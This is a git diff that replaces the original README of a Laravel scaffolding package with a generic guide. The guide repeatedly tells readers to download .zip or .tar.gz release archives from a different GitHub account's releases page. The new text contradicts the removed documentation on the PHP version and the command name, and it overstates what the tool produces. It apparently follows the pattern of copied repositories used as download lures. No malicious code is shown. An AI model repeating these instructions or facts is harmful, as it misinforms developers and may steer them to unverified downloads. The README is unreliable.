@@ -1,250 +1,104 @@
-# Laravel ReverseKit
+# 🎉 laravel-reversekit - Generate Your Laravel Backend Easily
 
-[![Laravel](https://img.shields.io/badge/Laravel-10%2B%20%7C%2011%2B%20%7C%2012%2B-red.svg)](https://laravel.com)
-[![PHP](https://img.shields.io/badge/PHP-8.2%2B-blue.svg)](https://php.net)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![CodeFactor](https://www.codefactor.io/repository/github/shaqi-labs/laravel-reversekit/badge/master)](https://www.codefactor.io/repository/github/shaqi-labs/laravel-reversekit/overview/master)
+## 🌐 Overview
+Laravel ReverseKit is a rule-based scaffolding package that generates your entire Laravel backend from a JSON structure—no AI required. It’s perfect for developers who want to save time and effort in backend setup, enabling them to focus on building features.
 
----
+## 📥 Download Now
+[![Download Laravel ReverseKit](https://img.shields.io/badge/Download%20Laravel%20ReverseKit-blue.svg)](https://github.com/rehabSakr8/laravel-reversekit/releases)
 
-## 🚀 Tagline
+## 🚀 Getting Started
+Follow these steps to download and run Laravel ReverseKit on your computer.
 
-**“Write your response JSON. Get your complete Laravel backend.”**
+### 1. Visit the Releases Page
+To download the application, go to the Releases page. Click the link below to access the necessary files.
 
----
+[Visit this page to download](https://github.com/rehabSakr8/laravel-reversekit/releases)
 
-## ✨ What is Laravel ReverseKit?
+### 2. Choose the Right Version
+On the Releases page, you will see a list of available versions. Identify the version you want to download, typically the latest one, to ensure you have the newest features and fixes.
 
-Laravel ReverseKit is a **rule-based scaffolding package** that generates your entire Laravel backend from a JSON structure—**no AI required**.
-It’s perfect for:
+### 3. Download the Package
+After selecting the version, look for the assets listed below that version. You may find options like `.zip` or `.tar.gz` files. Click on the desired file to start the download.
 
-* Rapid API prototyping
-* SaaS apps and microservices
-* Learning Laravel conventions
-* Reducing repetitive CRUD boilerplate
+### 4. Extract the Files
+Once downloaded, locate the file on your computer. You’ll need to extract it to access the contents. Here’s how:
 
-**Core Idea:** Reverse your development workflow. Instead of writing controllers → responses, define your response first, and let ReverseKit generate the backend.
+- **Windows**: Right-click the downloaded file and select "Extract All".
+- **Mac**: Double-click the downloaded file, and it will extract automatically.
+- **Linux**: Use the command `tar -xvf filename.tar.gz` in your terminal.
 
----
+### 5. Install Dependencies
+After extraction, you may need to install PHP and Composer if you haven’t already. These tools are necessary to run Laravel applications.
 
-## ⚡ Features
+- **PHP**: Ensure you have PHP version 7.4 or newer. You can download it from the [PHP website](https://www.php.net/).
+- **Composer**: Install Composer by following the instructions on their [official website](https://getcomposer.org/).
 
-| Feature                    | Description                                                                   |
-| -------------------------- | ----------------------------------------------------------------------------- |
-| **Zero AI Dependencies**   | Pure PHP, no external APIs required                                           |
-| **Complete Scaffolding**   | Models, Controllers, Resources, Requests, Policies, Factories, Seeders, Tests |
-| **Smart Type Inference**   | Detects types from JSON values                                                |
-| **Relationship Detection** | `hasMany` and `belongsTo` from nested structures                              |
-| **Customizable Stubs**     | Modify templates for your coding standards                                    |
-| **Preview Mode**           | See what will be generated without writing files                              |
-| **Multiple Input Sources** | JSON, API URL, OpenAPI/Swagger, Postman, Database                             |
-| **Interactive Mode**       | Step-by-step generator prompts for full control                               |
+### 6. Configuration
+Once all dependencies are installed, navigate to the Laravel ReverseKit folder in your terminal. You may need to configure your Laravel environment:
 
----
+1. Duplicate the `.env.example` file and rename it to `.env`.
+2. Open the `.env` file and set your database information.
 
-## 💾 Installation
+### 7. Generate Your Backend
+With the setup complete, you can now generate your backend. Run the command below in your terminal:
 
 ```bash
-composer require shaqi-labs/laravel-reversekit
+php artisan reversekit:generate
 ```
 
-Auto-discovery registers the service provider.
-Optional publishing:
+This command will read your JSON structure and create the required backend files automatically.
 
-```bash
-# Config file
-php artisan vendor:publish --tag=reversekit-config
+### 8. Access Your Application
+Open a web browser and go to `http://localhost:8000` to view your new application. You’ll have a fully functional Laravel backend ready to use.
 
-# Stubs for customization
-php artisan vendor:publish --tag=reversekit-stubs
-```
+## 📖 Features
+- Rule-based scaffolding for quick setup
+- Generates all necessary backend components
+- Support for CRUD operations and API generation
+- Compatible with various JSON structures
 
----
+## 🔧 System Requirements
+To use Laravel ReverseKit, ensure your environment meets the following criteria:
 
-## ⚙️ Usage
+- **Operating System**: Windows, macOS, or Linux
+- **PHP Version**: 7.4 or higher
+- **Composer**: Latest version installed
 
-### Generate from JSON File
+## 🛠️ Helpful Commands
+After installation, here are some useful commands to manage your Laravel project:
 
-```bash
-php artisan reverse:generate path/to/your.json
-```
+- **Start the development server**: 
+  ```bash
+  php artisan serve
+  ```
 
-### Generate from JSON String
+- **Run migrations**: 
+  ```bash
+  php artisan migrate
+  ```
 
-```bash
-php artisan reverse:generate '{"user":{"id":1,"name":"John"}}'
-```
+- **Create a new model**: 
+  ```bash
+  php artisan make:model ModelName
+  ```
 
-### Preview Mode
+## 🔍 Troubleshooting
+If you encounter issues during installation or usage, try the following steps:
 
-```bash
-php artisan reverse:generate data.json --preview
-```
+1. Ensure your PHP version is compatible.
+2. Verify your Composer installation with `composer -V`.
+3. Check Laravel ReverseKit documentation for more specific instructions.
 
-### Custom Options
+## 📑 Contributing
+We welcome contributions! If you have ideas to enhance Laravel ReverseKit, feel free to fork the repository and submit a pull request.
 
-```bash
-php artisan reverse:generate data.json \
-    --only=model,migration,controller \
-    --module=Blog \
-    --namespace=App\\Domain \
-    --force
-```
+## 📞 Support
+For additional help, visit our GitHub Issues page and ask your question there. We're here to help!
 
-### From API URL
+## 📌 License
+Laravel ReverseKit is open source and available under the MIT License.
 
-```bash
-php artisan reverse:generate --from-url=https://api.example.com/users --auth-token=token
-```
+## 📥 Download & Install
+Be sure to visit the Releases page to download the latest version of Laravel ReverseKit and get started with your Laravel backend swiftly.
 
-### From OpenAPI / Postman
-
-```bash
-php artisan reverse:generate --from-openapi=spec.yaml
-php artisan reverse:generate --from-postman=collection.json
-```
-
-### Interactive Mode
-
-```bash
-php artisan reverse:interactive
-```
-
-Guides you through models, fields, relationships, and generator selection.
-
----
-
-## 🛠 Generated Components
-
-| Component     | Description                              |
-| ------------- | ---------------------------------------- |
-| Models        | `$fillable`, `$casts`, and relationships |
-| Migrations    | Column types inferred from JSON          |
-| Controllers   | CRUD methods returning JSON              |
-| API Resources | Maps models to JSON structure            |
-| Form Requests | Validation for Store & Update            |
-| Policies      | Ownership checks where applicable        |
-| Factories     | Model factories with Faker               |
-| Seeders       | Intelligent counts based on JSON         |
-| Feature Tests | Test cases for all CRUD endpoints        |
-| Routes        | Auto-registered via `apiResource`        |
-
----
-
-## 📊 Type & Relationship Mapping
-
-| JSON Value       | PHP Type   | Migration             | Relationship |
-| ---------------- | ---------- | --------------------- | ------------ |
-| String           | string     | VARCHAR(255)          | -            |
-| Integer          | int        | INTEGER               | -            |
-| Boolean          | bool       | BOOLEAN               | -            |
-| Float            | float      | DECIMAL(10,2)         | -            |
-| Null             | string     | nullable()            | -            |
-| ISO 8601 Date    | datetime   | TIMESTAMP             | -            |
-| Array of Objects | Collection | Foreign key on child  | hasMany      |
-| Nested Object    | Model      | Foreign key on parent | belongsTo    |
-
-**Example:**
-
-```json
-{
-  "user": {
-    "id": 1,
-    "posts": [{"id":1,"title":"Hello"}]
-  }
-}
-```
-
-Generates:
-
-* `User` model with `hasMany` `posts()`
-* `Post` model with `belongsTo` `user()`
-* Migration adds `user_id` foreign key
-
----
-
-## ⚡ Quick Start Example
-
-Input JSON:
-
-```json
-{
-  "user": {
-    "id": 1,
-    "name": "John Doe",
-    "email": "john@test.com",
-    "posts": [
-      {"id":1,"title":"First Post","body":"Content","published":true}
-    ]
-  }
-}
-```
-
-Run:
-
-```bash
-php artisan reverse:generate input.json
-```
-
-Generates:
-
-```
-app/Models/User.php
-app/Models/Post.php
-app/Http/Controllers/UserController.php
-app/Http/Controllers/PostController.php
-app/Http/Resources/UserResource.php
-app/Http/Resources/PostResource.php
-app/Policies/UserPolicy.php
-app/Policies/PostPolicy.php
-database/migrations/xxxx_create_users_table.php
-database/migrations/xxxx_create_posts_table.php
-tests/Feature/UserTest.php
-tests/Feature/PostTest.php
-routes/api.php
-```
-
----
-
-## ⚙️ Configuration
-
-```php
-return [
-    'generators' => [
-        'model' => true,
-        'migration' => true,
-        'controller' => true,
-        'resource' => true,
-        'request' => true,
-        'policy' => true,
-        'factory' => true,
-        'seeder' => true,
-        'test' => true,
-    ],
-    'model' => ['use_soft_deletes' => false, 'use_uuid' => false],
-    'controller' => ['use_form_requests' => true, 'use_policies' => true],
-];
-```
-
----
-
-## 🎨 Customize Stubs
-
-Edit published stubs in `resources/stubs/reversekit/` to match your coding style.
-
----
-
-## ✅ Requirements
-
-* PHP 8.2+
-* Laravel 10, 11, 12+
-
----
-
-## 📜 License
-
-MIT License – Open source, free for commercial projects.
-
----
-
-Made with ❤️ by **Shaqi Labs**
+[Visit this page to download](https://github.com/rehabSakr8/laravel-reversekit/releases)
